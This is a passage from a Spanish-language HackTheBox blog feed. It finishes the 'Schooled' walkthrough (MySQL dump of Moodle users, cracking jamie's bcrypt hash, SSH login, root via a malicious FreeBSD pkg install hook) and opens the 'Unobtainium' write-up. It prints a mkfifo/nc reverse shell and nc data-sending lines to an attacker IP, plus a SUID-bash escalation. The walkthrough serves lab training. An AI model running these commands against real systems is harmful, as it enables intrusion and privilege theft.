&lt;p&gt;Us√©mosla para intentar ver el contenido de la base de datos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/usr/local/bin/mysqlshow -u moodle -pPlaybookMaster2020
+--------------------+
|     Databases      |
+--------------------+
| information_schema |
| moodle             |
+--------------------+
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Tenemos la base de datos &lt;code&gt;moodle&lt;/code&gt; (aunque ya lo sab√≠amos del archivo &lt;code&gt;config.php&lt;/code&gt;), veamos sus tablas:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/usr/local/bin/mysqlshow -u moodle -pPlaybookMaster2020 moodle
Database: moodle
+----------------------------------+
|              Tables              |
+----------------------------------+
| mdl_analytics_indicator_calc     |
| mdl_analytics_models             |
...
| mdl_user                         |
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora que tenemos una tabla llamativa podemos usar &lt;code&gt;mysqldump&lt;/code&gt; para ‚Äúdumpear‚Äù (realmente hace como si quisi√©ramos realizar un backup, por eso dumpea) la info de lo que le pidamos, en este caso de la tabla &lt;code&gt;mdl_user&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;/usr/local/bin/mysqldump -u moodle -pPlaybookMaster2020 moodle mdl_user
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335bash_wwwRS_mysqldump_MDLuserTable.png&quot; alt=&quot;335bash_wwwRS_mysqldump_MDLuserTable&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos muuuucha informaci√≥n, pero toda es relacionada con usuarios, si ajustamos la visi√≥n vemos un usuario llamado &lt;code&gt;jamie&lt;/code&gt; y que esta relacionado con el &lt;strong&gt;staff&lt;/strong&gt;, por lo que puede ser el mismo &lt;strong&gt;jamie&lt;/strong&gt; del sistema, podemos tomar su &lt;strong&gt;hash&lt;/strong&gt; e intentar crackearlo.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ cat jamie_hash
$2y$10$3D/gznFHdpV6PXt1cLPhX.ViTgs87DCE5KqphQhGYR5GFbcl4qTiW
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Usaremos &lt;code&gt;John The Ripper&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ john --wordlist=/usr/share/wordlists/rockyou.txt jamie_hash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)
1g 0:00:06:00 DONE (2021-04-12 25:25) 0.002771g/s 38.50p/s 38.50c/s 38.50C/s 010188..!QAZ2wsx
Use the &quot;--show&quot; option to display all of the cracked passwords reliably
Session completed
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Al parecer el resultado es &lt;code&gt;!QAZ2wsx&lt;/code&gt;, probemos mediante &lt;strong&gt;SSH&lt;/strong&gt; con el usuario &lt;strong&gt;jamie&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ ssh jamie@10.10.10.234
Password for jamie@Schooled:
Last login: Tue Mar 16 14:44:53 2021 from 10.10.14.5
FreeBSD 13.0-BETA3 (GENERIC) #0 releng/13.0-n244525-150b4388d3b: Fri Feb 19 04:04:34 UTC 2021

Welcome to FreeBSD!
...
jamie@Schooled:~ $ id
uid=1001(jamie) gid=1001(jamie) groups=1001(jamie),0(wheel)
jamie@Schooled:~ $ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfect√≠simo, tamos dentro de la m√°quina con una linda Shell :)&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de privilegios &lt;a href=&quot;#escalada-de-privilegios&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;Viendo los permisos que tiene &lt;code&gt;jamie&lt;/code&gt; en el sistema, tenemos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:~ $ sudo -l
User jamie may run the following commands on Schooled:
    (ALL) NOPASSWD: /usr/sbin/pkg update
    (ALL) NOPASSWD: /usr/sbin/pkg install *
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Opa, interesante, dos permisos, uno para actualizar paquetes (supongo) y otro para instalar paquetes de la ruta donde estemos. Y ambos los podemos ejecutar como cualquier usuario del sistema.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.freebsd.org/cgi/man.cgi?query=pkg&amp;amp;sektion=&amp;amp;n=1&quot;&gt;INFO &lt;strong&gt;pkg&lt;/strong&gt; binary&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;üì¶ &lt;strong&gt;&lt;em&gt;&lt;u&gt;pkg&lt;/u&gt; provides an interface for manipulating packages: registering, adding, removing and upgrading packages.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Dando vueltas para ver como podr√≠amos explotar esto, encontramos un post donde nos muestra un script que genera un paquete para posteriormente ser instalado:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;http://lastsummer.de/creating-custom-packages-on-freebsd/&quot;&gt;Creating Custom Packages on &lt;strong&gt;FreeBSD&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;El post toma el script por partes, pero la parte que nos interesa en la inicial, ya que es donde podemos modificar el c√≥digo que queremos que se ejecute mientras el paquete se esta instalando:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/sh

STAGEDIR=/tmp/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}

cat &amp;gt;&amp;gt; ${STAGEDIR}/+PRE_DEINSTALL &amp;lt;&amp;lt;EOF
# careful here, this may clobber your system
echo &quot;Resetting root shell&quot;
pw usermod -n root -s /bin/csh
EOF

cat &amp;gt;&amp;gt; ${STAGEDIR}/+POST_INSTALL &amp;lt;&amp;lt;EOF
# careful here, this may clobber your system
echo &quot;Registering root shell&quot;
pw usermod -n root -s /bin/sh
EOF
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Donde relativamente parece que resetea la Shell asignada al usuario &lt;strong&gt;root&lt;/strong&gt;, peroooo, podr√≠amos cambiar esos comandos por los nuestros, algo as√≠:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;#!/bin/sh

STAGEDIR=/tmp/stage
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}

cat &amp;gt;&amp;gt; ${STAGEDIR}/+PRE_DEINSTALL &amp;lt;&amp;lt;EOF
# careful here, this may clobber your system
echo &quot;1 root shell&quot;
whoami | nc 10.10.14.11 4434
EOF

cat &amp;gt;&amp;gt; ${STAGEDIR}/+POST_INSTALL &amp;lt;&amp;lt;EOF
# careful here, this may clobber your system
echo &quot;2 root shell&quot;
id | nc 10.10.14.11 4434
EOF
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Intentamos que nos env√≠e el output de &lt;code&gt;whoami&lt;/code&gt; y de &lt;code&gt;id&lt;/code&gt; a nuestro listener y ver que obtenemos.&lt;/p&gt;

&lt;p&gt;Esta parte es gen√©rica y estructural, entiendo que es necesaria para la creaci√≥n del paquete, pero no necesitamos modificar nada:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;cat &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST &amp;lt;&amp;lt;EOF
name: mypackage
version: &quot;1.0_5&quot;
origin: sysutils/mypackage
comment: &quot;automates stuff&quot;
desc: &quot;automates tasks which can also be undone later&quot;
maintainer: john@doe.it
www: https://doe.it
prefix: /
EOF

echo &quot;deps: {&quot; &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST
pkg query &quot;  %n: { version: \&quot;%v\&quot;, origin: %o }&quot; portlint &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST
pkg query &quot;  %n: { version: \&quot;%v\&quot;, origin: %o }&quot; poudriere &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST
echo &quot;}&quot; &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST

mkdir -p ${STAGEDIR}/usr/local/etc
echo &quot;# hello world&quot; &amp;gt; ${STAGEDIR}/usr/local/etc/my.conf
echo &quot;/usr/local/etc/my.conf&quot; &amp;gt; ${STAGEDIR}/plist

pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -p ${STAGEDIR}/plist -o .
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora ya podemos ejecutar el script y validar si se nos genera el paquete:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ ./aja.sh
jamie@Schooled:/tmp/aver $ ls
aja.sh mypackage-1.0_5.txz
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Listo, se genera correctamente (: Instal√©moslo:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install *.txz
Updating FreeBSD repository catalogue...
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero ac√° se queda pensando y no hace nada, as√≠ que buscando encontramos que probablemente el tema sea que intenta actualizar el cat√°logo de repositorios (como dice ah√≠) y por eso se queda pegado. Pero en este manual tenemos el par√°metro &lt;code&gt;--no-repo-update&lt;/code&gt; el cual se encarga precisamente de suprimir la actualizaci√≥n autom√°tica que intenta hacer:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://man.dragonflybsd.org/?command=pkg-install&amp;amp;section=8&quot;&gt;&lt;strong&gt;pkg install&lt;/strong&gt; - Install packages from remote package repositories or local archives&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si volvemos a intentar pero ahora con el nuevo argumento:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install --no-repo-update *.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        mypackage: 1.0_5

Number of packages to be installed: 1

Proceed with this action? [y/N]: y
[1/1] Installing mypackage-1.0_5...
Extracting mypackage-1.0_5: 100%
2 root shell
jamie@Schooled:/tmp/aver $ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, se ejecuta, en nuestro listener recibimos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù≠ nc -lvp 4434
listening on [any] 4434 ...
connect to [10.10.14.11] from schooled.htb [10.10.10.234] 39175
uid=0(root) gid=0(wheel) groups=0(wheel),5(operator)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Oko, tenemos ejecuci√≥n de comandos, pero recibimos el id, por lo tanto el primer apartado parece que no se est√° ejecutando, agreguemos nuestra reverse Shell en la parte de &lt;strong&gt;+POST_INSTALL&lt;/strong&gt; (segundo apartado):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;...
EOF

cat &amp;gt;&amp;gt; ${STAGEDIR}/+POST_INSTALL &amp;lt;&amp;lt;EOF
# careful here, this may clobber your system
echo &quot;2 root shell&quot;
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i | nc 10.10.14.11 4434 &amp;gt; /tmp/f
EOF

cat &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST &amp;lt;&amp;lt;EOF
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Pero al ejecutar la instalaci√≥n del paquete obtenemos o errores o simplemente nada.&lt;/p&gt;

&lt;p&gt;As√≠ que podemos probar a modificar la &lt;code&gt;/bin/bash&lt;/code&gt; a &lt;strong&gt;SUID&lt;/strong&gt;:&lt;/p&gt;

&lt;p&gt;‚õπÔ∏è &lt;strong&gt;&lt;u&gt;SUID?&lt;/u&gt;&lt;/strong&gt; &lt;strong&gt;&lt;em&gt;‚Ä¶ it‚Äôs a way in UNIX-like operating systems of &lt;u&gt;running a command as another user without providing credentials&lt;/u&gt;.&lt;/em&gt;&lt;/strong&gt; &lt;a href=&quot;https://www.pentestpartners.com/security-blog/exploiting-suid-executables/&quot;&gt;pentestpartners - exploiting-suid-executables&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ ls -la /bin/bash
lrwxr-xr-x  1 root  wheel  19 Apr  1 17:02 /bin/bash -&amp;gt; /usr/local/bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Vemos que &lt;code&gt;/bin/bash&lt;/code&gt; tiene un link hacia &lt;code&gt;/usr/local/bin/bash&lt;/code&gt;, o sea que cuando ejecutemos &lt;code&gt;/bin/bash&lt;/code&gt;, esteremos ejecutando realmente &lt;code&gt;/usr/local/bin/bash&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ ls -la /usr/local/bin/bash
-rwxr-xr-x  1 root  wheel  941288 Feb 20 01:47 /usr/local/bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Entonces modificamos los permisos agreg√°ndole el &lt;strong&gt;SUID&lt;/strong&gt; (&lt;code&gt;4&lt;/code&gt;) al binario &lt;code&gt;/bin/bash&lt;/code&gt;, que realmente se los estar√≠a otorgando al binario &lt;code&gt;/usr/local/bin/bash&lt;/code&gt; :)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;...
EOF

cat &amp;gt;&amp;gt; ${STAGEDIR}/+POST_INSTALL &amp;lt;&amp;lt;EOF
# careful here, this may clobber your system
echo &quot;2 root shell&quot;
chmod 4755 /bin/bash
EOF

cat &amp;gt;&amp;gt; ${STAGEDIR}/+MANIFEST &amp;lt;&amp;lt;EOF
...
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Generamos paquete e instalamos:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ ./aja.sh 
jamie@Schooled:/tmp/aver $ sudo /usr/sbin/pkg install --no-repo-update *.txz
pkg: Repository FreeBSD has a wrong packagesite, need to re-create database
pkg: Repository FreeBSD cannot be opened. 'pkg update' required
Checking integrity... done (0 conflicting)
The following 1 package(s) will be affected (of 0 checked):

New packages to be INSTALLED:
        mypackage: 1.0_5

Number of packages to be installed: 1

Proceed with this action? [y/N]: y
[1/1] Installing mypackage-1.0_5...
Extracting mypackage-1.0_5: 100%
2 root shell
jamie@Schooled:/tmp/aver $ 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ahora validamos los permisos de los binarios:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ ls -la /bin/bash
lrwxr-xr-x  1 root  wheel  19 Apr  1 17:02 /bin/bash -&amp;gt; /usr/local/bin/bash
jamie@Schooled:/tmp/aver $ ls -la /usr/local/bin/bash
-rwsr-xr-x  1 root  wheel  941288 Feb 20 01:47 /usr/local/bin/bash
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Perfecto, vemos el nuevo permiso asignado con una &lt;code&gt;s&lt;/code&gt; en la ejecuci√≥n.&lt;/p&gt;

&lt;p&gt;Ahora simplemente indicamos &lt;code&gt;/usr/local/bin/bash -p&lt;/code&gt; para que ejecute el programa con los permisos &lt;strong&gt;SUID&lt;/strong&gt; que tenga asignados el objeto. Como el due√±o del binario es &lt;code&gt;root&lt;/code&gt;, tomara el &lt;strong&gt;SUID de ese usuario&lt;/strong&gt;, por lo tanto tendremos una Shell como √©l.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;jamie@Schooled:/tmp/aver $ /usr/local/bin/bash -p
[jamie@Schooled /tmp/aver]# whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Y si (: tenemos una sesi√≥n como &lt;strong&gt;root&lt;/strong&gt;, solo nos quedar√≠a ver las flags:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/schooled/335flags.png&quot; alt=&quot;335flags&quot; /&gt;&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;Linda m√°quina eh! Linda linda, me gusto mucho como le robamos la cookie al profesor y como nos aprovechamos del rol &lt;strong&gt;manager&lt;/strong&gt; para conseguir &lt;strong&gt;RCE&lt;/strong&gt;, muy lindo todo.&lt;/p&gt;

&lt;p&gt;(Adem√°s que me permiti√≥ explorar a profundidad la creaci√≥n de un exploit bastante &lt;strong&gt;retador&lt;/strong&gt;)&lt;/p&gt;

&lt;p&gt;Y bueno, como siempre y como nunca, much√≠simas gracias y a seguir rompiendo todo ;)&lt;/p&gt;
</description>
        <pubDate>Sat, 11 Sep 2021 00:00:00 -0700</pubDate>
        <link>http://localhost:4000/htb/schooled</link>
        <guid isPermaLink="true">http://localhost:4000/htb/schooled</guid>
        
        <category>moodle</category>
        
        <category>CSRF</category>
        
        <category>cookie-hijacking</category>
        
        <category>pkg</category>
        
        <category>SUID</category>
        
        <category>sudo</category>
        
        <category>FreeBSD</category>
        
        
        <category>htb</category>
        
      </item>
    
      <item>
        <title>HackTheBox - Unobtainium</title>
        <description>&lt;p&gt;M√°quina Linux nivel dif√≠cil. Explotaremos una app de Linux. Jugando con librer√≠as de &lt;code&gt;JavaScript&lt;/code&gt;, la infectaremos (&lt;strong&gt;Prototype Pollution&lt;/strong&gt; en &lt;code&gt;lodash&lt;/code&gt;)  y haremos &lt;strong&gt;command-injection&lt;/strong&gt; (en &lt;code&gt;google-cloudstorage-commands&lt;/code&gt;). Y moveremos internamente muchas cosas con &lt;code&gt;Kubernetes&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338unobtainiumHTB.png&quot; alt=&quot;338unobtainiumHTB&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;tldr-spanish-writeup&quot;&gt;TL;DR (Spanish writeup)&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;Creada por&lt;/strong&gt;: &lt;a href=&quot;https://www.hackthebox.eu/profile/27390&quot;&gt;felamos&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Bueeeeno, nos encontraremos con un servidor web el cual nos entregara en las manitas un paquete &lt;code&gt;.deb&lt;/code&gt;, antes de instalarlo en el sistema jugaremos con algunas herramientas para ver el contenido de ese paquete, Instalaremos el paquete &lt;strong&gt;.deb&lt;/strong&gt; y obtendremos el binario &lt;strong&gt;unobtainium&lt;/strong&gt; en el sistema. La aplicaci√≥n permite enviar mensajes en forma de ‚Äúchat‚Äù y podremos verlos reflejados ya sea en la web o en la propia app.&lt;/p&gt;

&lt;p&gt;Jugaremos y jugaremos para encontrar algunos errores, esos errores hablar√°n por si solos (y nos apoyaremos de los archivos encontrados en el paquete para darle m√°s fuerza a nuestra b√∫squeda), lograremos leer archivos de la app usando un apartado llamado &lt;code&gt;/todo&lt;/code&gt;. Entre eso obtendremos el c√≥digo fuente de la aplicaci√≥n.&lt;/p&gt;

&lt;p&gt;Inspeccion√°ndolo encontraremos varias brechas en dos librer√≠as de &lt;code&gt;JavaScript&lt;/code&gt;, un envenenamiento de prototipos (&lt;strong&gt;Prototype Pollution&lt;/strong&gt;) en la librer√≠a &lt;code&gt;lodash&lt;/code&gt; y otra &lt;strong&gt;inyectando comandos&lt;/strong&gt; sobre &lt;code&gt;google-cloudstorage-commands&lt;/code&gt;. Jugando con ellas lograremos &lt;strong&gt;ejecuci√≥n remota de comandos&lt;/strong&gt; sobre el contenedor que sirve el app.&lt;/p&gt;

&lt;p&gt;Con &lt;strong&gt;Python&lt;/strong&gt; creamos este script to lindo, ya sea para obtener una Shell desde √©l o para ejecutar comandos en el contenedor.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://github.com/lanzt/blog/blob/main/assets/scripts/HTB/unobtainium/pollutionRCE.py&quot;&gt;pollutionRCE.py&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Estando dentro del contenedor encontraremos que con lo √∫nico que podemos jugar es con &lt;code&gt;Kubernetes&lt;/code&gt;, moveremos y moveremos (y seguiremos moviendo) cosas para volver a realizar el ataque de &lt;strong&gt;Prototype Pollution + Command Injection&lt;/strong&gt; peeeeero ahora sobre el entorno de desarrollo que esta internamente corriendo (antes lo hicimos en el de &lt;strong&gt;producci√≥n&lt;/strong&gt; :P)&lt;/p&gt;

&lt;p&gt;Ya dentro, veremos que podemos listar ‚Äúsecretos‚Äù (claves, contrase√±as, texto privado, tokens, etc.) de &lt;code&gt;Kubernetes&lt;/code&gt; (algo que antes no). Uno de esos secretos contiene el token del &lt;code&gt;admin&lt;/code&gt; de &lt;strong&gt;Kubernetes&lt;/strong&gt;, con √©l tendremos control total contra el servicio (de nuevo) &lt;strong&gt;Kubernetes&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Lo que nos dar√° la opci√≥n de crearnos un &lt;strong&gt;pod&lt;/strong&gt; (‚Äúconjunto de contenedores‚Äù) malicioso que copie toooooda la ra√≠z del sistema en una carpeta de ese &lt;strong&gt;pod&lt;/strong&gt; (a la vez que ejecuta una &lt;strong&gt;Reverse Shell&lt;/strong&gt;), as√≠ tendremos acceso a todos los archivos.&lt;/p&gt;

&lt;p&gt;YA FIN üßé&lt;/p&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h3 id=&quot;clasificaci√≥n-de-la-m√°quina-seg√∫n-la-gentesita&quot;&gt;Clasificaci√≥n de la m√°quina seg√∫n la gentesita&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/unobtainium/338statistics.png&quot; style=&quot;display: block; margin-left: auto; margin-right: auto; width: 80%;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Mucha enumeraci√≥n, algunas vulns conocidas, pero sobre todo bastante llevada a la realidad, me gusta.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Escribo para tener mis ‚Äúnotas‚Äù, por si algun dia se me olvida todo, leer esto y reencontrarme (o talvez no) :) adem√°s de enfocarme en plasmar mis errores y exitos (por si ves mucho texto), todo desde una perspectiva m√°s de ense√±anza que de solo plasmar lo que hice.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;p&gt;SHS 25.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;a href=&quot;#reconocimiento&quot;&gt;Reconocimiento&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#enumeracion&quot;&gt;Enumeraci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#puerto-80&quot;&gt;Descubrimos que hay en el servidor web del puerto 80&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#enum-deb-withar&quot;&gt;Descargamos un paquete &lt;strong&gt;.deb&lt;/strong&gt; alojado en la web y lo desbaratamos&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#explotacion&quot;&gt;Explotaci√≥n&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#found-indexjs&quot;&gt;Encontramos el c√≥digo fuente de la &lt;strong&gt;API&lt;/strong&gt; con ayuda de &lt;strong&gt;BurpSuite&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#prototype-pollution&quot;&gt;Contaminamos prototipos para asignar objeto &lt;strong&gt;canUpdate&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#prototype-pollution-rce&quot;&gt;RCE - &lt;strong&gt;Prototype Pollution (&lt;u&gt;lodash.merge&lt;/u&gt;) &amp;amp; Command Injection (&lt;u&gt;google-cloudstorage&lt;/u&gt;)&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#lateral-webapp-devnode&quot;&gt;Movimiento lateral : docker-webapp -&amp;gt; docker-devnode&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#expl-webapp-api-kubectl&quot;&gt;Jugando con la API** y &lt;strong&gt;kubectl&lt;/strong&gt; contra &lt;strong&gt;Kubernetes&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#expl-webapp-bash-pollution&quot;&gt;RCE interno: &lt;strong&gt;Pollution + Command Injection&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#escalada-de-privilegios&quot;&gt;Escalada de privilegios&lt;/a&gt;.
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;#lateral-tokenadmin-found&quot;&gt;Encontramos ‚Äúsecreto‚Äù del &lt;strong&gt;admin&lt;/strong&gt; y obtenemos interacci√≥n total con &lt;strong&gt;Kubernetes&lt;/strong&gt;&lt;/a&gt;.&lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;#malicious-pod&quot;&gt;Generamos &lt;strong&gt;pod&lt;/strong&gt; malicioso&lt;/a&gt;.&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento &lt;a href=&quot;#reconocimiento&quot;&gt;#&lt;/a&gt;&lt;/h1&gt;

&lt;p&gt;‚Ä¶&lt;/p&gt;

&lt;h2 id=&quot;enum-nmap&quot;&gt;Enumeraci√≥n de puertos con nmap &lt;a href=&quot;#enum-nmap&quot;&gt;üìå&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;Lo primero ser√° encontrar que puertos est√°n abiertos en la m√°quina, lo haremos apoyados de &lt;code&gt;nmap&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± nmap -p- --open -v 10.10.10.235 -oG initScan
&lt;/code&gt;&lt;/pre&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Par√°metro&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Descripci√≥n&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;-p-&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Escanea todos los 65535&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;‚Äìopen&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Solo los puertos que est√°n abiertos&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-v&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Permite ver en consola lo que va encontrando&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;-oG&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Guarda el output en un archivo con formato grepeable para usar una &lt;a href=&quot;https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/magic/extractPorts.png&quot;&gt;funci√≥n &lt;strong&gt;extractPorts&lt;/strong&gt;&lt;/a&gt; de &lt;a href=&quot;https://s4vitar.github.io/&quot;&gt;S4vitar&lt;/a&gt; que me extrae los puertos en la clipboard&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Este escaneo nos muestra:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;‚ù± cat initScan
# Nmap 7.80 scan initiated Wed Jun 30 25:25:25 2021 as: nmap -p- --open -v -oG initScan 10.10.10.235
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 10.10.10.235 ()	Status: Up
Host: 10.10.10.235 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 2379/open/tcp//etcd-client///, 2380/open/tcp//etcd-server///, 8443/open/tcp//https-alt///, 10250/open/tcp/////, 10256/open/tcp/////, 31337/open/tcp//Elite///
# Nmap done at Wed Jun 30 25:25:25 2021 -- 1 IP address (1 host up) scanned in 92.68 seconds
